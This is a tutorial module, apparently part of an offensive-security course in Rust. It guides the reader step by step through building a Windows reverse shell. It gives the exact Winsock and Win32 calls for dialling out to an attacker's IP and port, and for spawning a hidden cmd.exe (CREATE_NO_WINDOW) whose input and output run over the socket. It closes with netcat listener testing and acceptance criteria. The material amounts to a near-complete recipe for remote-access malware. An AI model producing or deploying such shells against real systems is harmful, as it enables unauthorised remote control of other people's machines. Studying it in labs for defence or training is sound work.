# Module 12 — Custom Reverse Shell

## Concept

A reverse shell makes the **target machine connect out to the attacker**, rather than the attacker connecting in to the target. This sidesteps firewalls that block inbound connections but allow outbound traffic.

This module builds a reverse shell using raw Winsock rather than Rust's `std::net`. The reason: `TcpStream` gives you a Rust I/O abstraction, but you need a raw Win32 `HANDLE` you can hand directly to `CreateProcessA`. Winsock's `WSASocketA` produces a `SOCKET` value that is simultaneously a valid Win32 handle — so you can pass it as the child process's stdin, stdout, and stderr in one move.

### Why std::net won't work here

`std::net::TcpStream` wraps the socket in Rust's abstraction layer. You cannot extract a raw inheritable `HANDLE` from it reliably. `WSASocketA` creates the same underlying socket, but gives you the raw handle the Win32 API needs.

### What the shell looks like to the target

- No file is dropped to disk (this binary is self-contained).
- The process list shows `cmd.exe` with a parent PID matching your binary.
- Outbound TCP connection to the attacker's IP:port — the most visible network indicator.

---

## How it works

```
[attacker]  nc -lvnp 4444
                  ↑  TCP connection
[target]    reverse-shell.exe
              │
              ├── WSAStartup        — initialize Winsock
              ├── WSASocketA        — create a TCP socket
              ├── SetHandleInformation — make the socket inheritable
              ├── connect           — dial the attacker
              └── CreateProcessA    — spawn cmd.exe with socket as stdin/stdout/stderr
```

Once `CreateProcessA` returns, the attacker's terminal is wired directly to `cmd.exe`'s I/O streams over the TCP socket.

---

## Why `SetHandleInformation` is required

Winsock sockets are **not inheritable** by default. When `CreateProcessA` is called with `bInheritHandles = TRUE`, it only duplicates handles that have the `HANDLE_FLAG_INHERIT` flag set. Without this call, `cmd.exe` inherits nothing — and the I/O handles in `STARTUPINFOA` point to handles the child cannot use, causing it to immediately exit or hang.

---

## Task

Implement the reverse shell in six steps. Each `todo!()` in `src/main.rs` corresponds to one step.

### Step 1 — Initialize Winsock

```
WSAStartup(
    wversionrequested: u16,   // 0x0202 — request version 2.2 (MAKEWORD(2, 2))
    lpwsadata: *mut WSADATA,  // out: filled with the implementation's capabilities
) -> i32                      // 0 on success; the return value itself is the error code
```

`WSADATA` must be zeroed before the call. Unlike most Win32 APIs, the error code is the return value directly — do not call `WSAGetLastError()` here.

### Step 2 — Create a TCP socket

```
WSASocketA(
    af: ADDRESS_FAMILY,                              // AF_INET — IPv4
    type_: SOCKET_TYPE,                              // SOCK_STREAM — TCP
    protocol: IPPROTO,                               // IPPROTO_TCP
    lpprotocolinfo: Option<*const WSAPROTOCOL_INFOA>, // None — use default protocol entry
    g: u32,                                          // 0 — no socket group
    dwflags: u32,                                    // 0
) -> SOCKET                                          // INVALID_SOCKET on failure
```

Check that the returned `SOCKET` is not `INVALID_SOCKET`. `SOCKET` wraps a `usize`; `INVALID_SOCKET` is `SOCKET(usize::MAX)`.

### Step 3 — Make the socket handle inheritable

```
SetHandleInformation(
    hobject: HANDLE,        // sock.0 as HANDLE — the socket treated as a Win32 handle
    dwmask: HANDLE_FLAGS,   // HANDLE_FLAG_INHERIT — which flag bits this call changes
    dwflags: HANDLE_FLAGS,  // HANDLE_FLAG_INHERIT — the new value for those bits (set = inherit)
) -> Result<()>
```

Both `dwmask` and `dwflags` are `HANDLE_FLAG_INHERIT`. The mask says "touch this bit"; the flags say "set it to this value".

### Step 4 — Connect to the attacker's listener

First, build the address structure:

```
SOCKADDR_IN {
    sin_family: ADDRESS_FAMILY,  // AF_INET
    sin_port:   u16,             // htons(ATTACKER_PORT) — port in network (big-endian) byte order
    sin_addr:   IN_ADDR,         // see note below
    sin_zero:   [i8; 8],         // zero-padded
}
```

`IN_ADDR` on Windows is a union. Access it as:
```rust
IN_ADDR { S_un: IN_ADDR_0 { S_addr: inet_addr(ATTACKER_IP.as_ptr()) } }
```

`inet_addr` converts a dotted-decimal string (`b"127.0.0.1\0"`) directly to a `u32` in network byte order.

Then connect:

```
connect(
    s: SOCKET,             // sock
    name: *const SOCKADDR, // &addr as *const SOCKADDR_IN as *const SOCKADDR
    namelen: i32,          // mem::size_of::<SOCKADDR_IN>() as i32
) -> i32                   // 0 on success, SOCKET_ERROR (-1) on failure
```

### Step 5 — Spawn cmd.exe with socket handles

Build the startup info:

```
STARTUPINFOA {
    cb:         u32,               // mem::size_of::<STARTUPINFOA>() as u32 — must be set
    dwFlags:    STARTUPINFOW_FLAGS, // STARTF_USESTDHANDLES — tells CreateProcessA to use hStd*
    hStdInput:  HANDLE,            // sock.0 as HANDLE — child reads from the socket
    hStdOutput: HANDLE,            // sock.0 as HANDLE — child writes stdout to the socket
    hStdError:  HANDLE,            // sock.0 as HANDLE — child writes stderr to the socket
    ..Default::default()
}
```

Then create the process:

```
CreateProcessA(
    lpapplicationname: PCSTR,                         // PCSTR::null() — use lpCommandLine instead
    lpcommandline: PSTR,                              // PSTR(cmd.as_mut_ptr()) — mutable byte slice b"cmd.exe\0"
    lpprocessattributes: Option<*const SECURITY_ATTRIBUTES>, // None
    lpthreadattributes:  Option<*const SECURITY_ATTRIBUTES>, // None
    binherithandles: BOOL,                            // TRUE — child inherits the socket handle
    dwcreationflags: PROCESS_CREATION_FLAGS,          // CREATE_NO_WINDOW — no console popup
    lpenvironment: Option<*const c_void>,             // None — inherit parent's environment
    lpcurrentdirectory: PCSTR,                        // PCSTR::null() — inherit parent's CWD
    lpstartupinfo: *const STARTUPINFOA,               // &si
    lpprocessinformation: *mut PROCESS_INFORMATION,   // &mut pi — out: process and thread handles
) -> Result<()>
```

`lpcommandline` must point to a **mutable** buffer. Declare the command as `let mut cmd = *b"cmd.exe\0";` and pass `PSTR(cmd.as_mut_ptr())`.

### Step 6 — Wait for the shell to exit

```
WaitForSingleObject(
    hhandle: HANDLE,       // pi.hProcess — the cmd.exe process object
    dwmilliseconds: u32,   // INFINITE — block until the child exits naturally
) -> WAIT_EVENT
```

---

## Testing

On the same machine (or your VM):

```bash
# Terminal 1 — listener
nc -lvnp 4444

# Terminal 2 — run the binary (in Wine or on Windows)
./reverse-shell.exe
```

Terminal 1 should receive a `cmd.exe` prompt you can type into.

---

## Acceptance Criteria

- [ ] `WSAStartup` return value checked (non-zero = failed, assert or panic)
- [ ] `WSASocketA` result checked for `INVALID_SOCKET`
- [ ] `SetHandleInformation` called before `CreateProcessA` — socket is inheritable
- [ ] `SOCKADDR_IN.sin_port` set with `htons()` (not raw port number)
- [ ] `connect` return value checked for `SOCKET_ERROR`
- [ ] `STARTUPINFOA.cb` set to `mem::size_of::<STARTUPINFOA>() as u32`
- [ ] `STARTUPINFOA.dwFlags` includes `STARTF_USESTDHANDLES`
- [ ] All three of `hStdInput`, `hStdOutput`, `hStdError` set to the socket handle
- [ ] `CreateProcessA` called with `bInheritHandles = TRUE`
- [ ] `CreateProcessA` called with `CREATE_NO_WINDOW`
- [ ] Running the binary connects a working `cmd.exe` shell to `nc -lvnp 4444`

---

## Key Types

**`WSADATA`** — output struct filled by `WSAStartup`. You only need to zero it before the call; you don't use its fields directly.

**`SOCKET`** — a `usize` wrapper. Treat it as an opaque handle. `INVALID_SOCKET = SOCKET(usize::MAX)`. You can cast it to a Win32 `HANDLE` with `HANDLE(sock.0 as isize)`.

**`ADDRESS_FAMILY`** — `u16` newtype. `AF_INET` is `ADDRESS_FAMILY(2)`.

**`IN_ADDR`** — a union with a `S_un` field of type `IN_ADDR_0`, which itself has a `S_addr: u32` field. This is the IPv4 address in network byte order. `inet_addr` fills it correctly from a dotted-decimal string.

**`STARTF_USESTDHANDLES`** — the flag that tells `CreateProcessA` to use `hStdInput`/`hStdOutput`/`hStdError` from the `STARTUPINFOA` struct rather than the process's own console handles.

---

## Hints

- `inet_addr` expects a null-terminated C string. Pass `b"127.0.0.1\0".as_ptr()` — the `as_ptr()` gives `*const u8`, which is the right type.
- If `nc` closes immediately, the socket is not inheritable — double-check that `SetHandleInformation` was called and that `bInheritHandles` is `TRUE`.
- `PCSTR::null()` is the correct way to pass a null `lpApplicationName`. Do not pass `b"\0"` — that's a pointer to a one-byte string, not null.
- The `cmd` buffer must be mutable (`let mut cmd = *b"cmd.exe\0";`) because `CreateProcessA` is allowed to modify the command line string.
- Compare against module 02 (process injection): there you created a remote thread; here you instead redirect the process's I/O streams. No shellcode, no remote writes — just handle plumbing.

---

## Submission

Paste `12-reverse-shell/src/main.rs` and ask for a review.
